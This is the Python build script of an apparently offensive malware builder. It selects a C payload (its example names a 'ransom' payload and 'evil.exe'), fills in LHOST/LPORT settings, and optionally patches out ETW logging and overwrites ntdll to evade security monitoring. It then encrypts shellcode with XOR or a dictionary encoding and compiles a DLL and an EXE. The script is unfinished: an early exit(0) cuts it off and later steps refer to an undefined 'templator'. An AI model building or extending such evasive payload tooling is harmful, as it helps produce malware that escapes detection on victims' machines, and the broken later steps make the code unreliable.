#!/usr/bin/env python3
from configparser import ConfigParser
import argparse
import os
from core.encryptor import Encryptor
from core.templator import Templator
from core.configator import check_config_and_merge
from core.utils import round_pow2
from core.orchestrator import prepare_build_env, build_dll, build_exe

PAYLOAD_DIR = "src/dll/payloads"
WORKING_FOLDER = "build/"

config = ConfigParser()
config.read(".conf")

# Custom formatter: show defaults normally, but DO NOT append "(default: ...)"
# for arguments whose dest starts with "payload_" or which are evasions.
class _Fmt(argparse.ArgumentDefaultsHelpFormatter, argparse.RawDescriptionHelpFormatter):
    # Add here any dest names for which we don't want the "(default: ...)" suffix
    _no_default_dests = {"etw", "ntdll"}

    def _get_help_string(self, action):
        dest = getattr(action, "dest", "")
        # Hide defaults for dynamic payload flags (dest starts with payload_)
        # and for explicit evasions listed in _no_default_dests.
        if dest.startswith("payload_") or dest in self._no_default_dests:
            return action.help
        return argparse.ArgumentDefaultsHelpFormatter._get_help_string(self, action)


EPILOG = """Examples:
  build.py -o evil.exe --ransom --etw -v
  build.py --small -o demo.exe --debug
  build.py --help
"""

DESCRIPTION = """Usage:
  build.py [options] --<payload>
"""

def _discover_payloads(payload_dir: str):
    names = []
    if os.path.isdir(payload_dir):
        for f in sorted(os.listdir(payload_dir)):
            if f.endswith(".c"):
                names.append(f[:-2])
    return names

def get_selected_payload(args):
    payload = None
    for name in _discover_payloads(PAYLOAD_DIR):
        if getattr(args, f"payload_{name}", False):
            payload = name
            break
    assert payload is not None  # devrait être garanti par parse_args()
    return payload

def parse_args(argv=None):
    # We disable the automatic -h so we can add it inside our "Options" group.
    parser = argparse.ArgumentParser(
        description=DESCRIPTION,
        epilog=EPILOG,
        formatter_class=_Fmt,
        add_help=False,
    )

    # ----- Options (group) -----
    opt = parser.add_argument_group("Options")
    # Manually add help so it appears under the "Options" header
    opt.add_argument("-h", "--help", action="help", help="show this help message and exit")
    opt.add_argument("-o", "--output", type=str, default="executable.exe",
                     help="Output file name")
    opt.add_argument("-s", "--small", action="store_true",
                     help="Prioritize size over other factors")
    opt.add_argument("-v", "--verbose", action="store_true",
                     help="Enable verbose mode")

    # ----- Payloads (group + mutually exclusive) -----
    payload_group = parser.add_argument_group(
        "Payload",
        "Exactly one payload must be specified. "
        f"Payload flags map to {PAYLOAD_DIR}/<name>.c"
    )
    mex = payload_group.add_mutually_exclusive_group(required=False)

    payload_names = _discover_payloads(PAYLOAD_DIR)
    for name in payload_names:
        # dest names start with "payload_" so our custom formatter can detect them
        mex.add_argument(f"--{name}", dest=f"payload_{name}",
                         action="store_true", help=f"Use payload '{name}'")


    # ----- Evasions (separate group) -----
    evasions = parser.add_argument_group("Evasions")
    evasions.add_argument("--etw", action="store_true", help="Disable ETW")
    evasions.add_argument("--ntdll", action="store_true", help="Overwrite ntdll from disk")


    # You previously used a "command" idea; keep it if you need commands later.
    # For now we keep no subcommands, so just parse.
    args = parser.parse_args(argv)

    # ----- Validation: require exactly one payload -----
    selected = [k for k, v in vars(args).items() if k.startswith("payload_") and v]
    if len(selected) != 1:
        if payload_names:
            choices = ", ".join(f"--{n}" for n in payload_names)
            parser.error(f"Exactly one payload must be specified. Available: {choices}")
        else:
            parser.error(f"No payloads found in {PAYLOAD_DIR}")

    args.payload_name = selected[0][8:]  # drop "payload_" prefix

    return args

def main():
    args = parse_args()
    print(args) if args.verbose else None

    args = check_config_and_merge(config, args)

    # logger todo here

    """
    Steps:
        - sed files with config values, checks, evasions, payloads and so (LHOST, LPORT, etc)     -> templator.py
        - encrypt payload with selected method (xor/dict/etc)                                     -> encryptor.py
        - Replace payload in main app
        - build dll                                                                               -> scripts/compile_dll.sh
        - build exe                                                                               -> scripts/compile_exe.sh
    """

    # Ici on est en mode "build" avec exactement 1 payload sélectionné
    # Récupère le nom du payload choisi
    payload = get_selected_payload(args)

    if args.verbose:
        print(f"[i] building with payload='{payload}', output='{args.output}', small={args.small}")

    # Step 0: Prepare build environment
    prepare_build_env() # rm -rf build && mkdir -p build/bin bin && cp -r src include build/


    # Step 1: Replace templates in payload file
    dll_templator = Templator(working_folder="build/dll/", templates_folder="src/templates/", verbose=args.verbose)
    # replace all patterns execpt list of exceptions
    tags_by_file = dll_templator.extract_tags_from_folder("build/dll/")
    tags_by_file += dll_templator.extract_tags_from_folder("build/common/")
    print(tags_by_file) if args.verbose else None
    dll_templator.replace_tags(tags_by_file)

    if args.etw:
        dll_templator.sed_files("%__ETW_PATCHING__%", "patch_etw();")
    else: 
        dll_templator.sed_files("%__ETW_PATCHING__%", "// ETW patching not enabled")

    build_dll(payload, verbose=args.verbose)  # bash scripts/compile_dll.sh payload
    exit(0)  # TODO remove me when done testing


    # Step 2: Encrypt payload
    if "dict" in config.get("Payload", "encryption_method"):
        with open(f"{PAYLOAD_DIR}/{payload}.c", 'rb') as file:
            content = file.read()
            payload = content.hex()
        encryptor = Encryptor(method="dict", verbose=args.verbose)  # init
        encryptor.set_wordlist("data/words_100000.txt")             # set self.wordlist
        encrypted_payload = encryptor.dict_encrypt(payload)         # get encrypted payload, C formatted
        dict_table = encryptor.get_association_table()              # get C association table
        dict_size = encryptor.get_nb_words()                      # get final size of the dictionary

    elif "xor" in config.get("Payload", "encryption_method"):
        # with open(f"{PAYLOAD_DIR}/{payload}.c", "r") as f:
        #     payload = f.read().encode()
        # encryptor = Encryptor(method="xor", verbose=args.verbose)
        # encryptor.set_key(config.getint("Payload", "encryption_key", fallback=0x1337))
        # encrypted_payload = encryptor.xor_encrypt(payload)
        pass
    else:
        raise ValueError("Unknown encryption method")

    # Step 3: Replace payload in main app

    if "dict" in config.get("Payload", "encryption_method"):
        templator.sed_files("%__PAYLOAD_SIZE__%", str(round_pow2(dict_size)))
        templator.sed_files("%__SHELLCODE_DECODER__%", "DICT_decrypt(dict_payload);")
        templator.sed_files("%__SHELLCODE__%", f"unsigned char payload[];\n\n{dict_table}\n\nconst char* dict_payload = {encrypted_payload};")
    elif "xor" in config.get("Payload", "encryption_method"):
        # templator.sed_files("%__PAYLOAD_SIZE__%", str(round_pow2(len(encrypted_payload)//2)))
        # templator.sed_files("%__SHELLCODE_DECODER__%", f"XOR_decrypt(xor_payload, {config.getint('Payload', 'encryption_key', fallback=0x1337)});")
        # templator.sed_files("%__SHELLCODE__%", f"unsigned char payload[] = \"{format_instructions(encrypted_instructions)}\";")
        pass

    if args.small:
        templator.sed_files("int WinMain(", "int WinMainCRTStartup(")


    # --------- EVASIONS ---------

   

    if args.ntdll:
        print("[i] ntdll evasion not implemented yet")

    # Step 4: Build EXE
    build_exe(args.output, prioritize_size=args.small, verbose=args.verbose)  # bash scripts/compile_exe.sh -o <output_file> --prioritize-size <true|false>


if __name__ == "__main__":
    main()
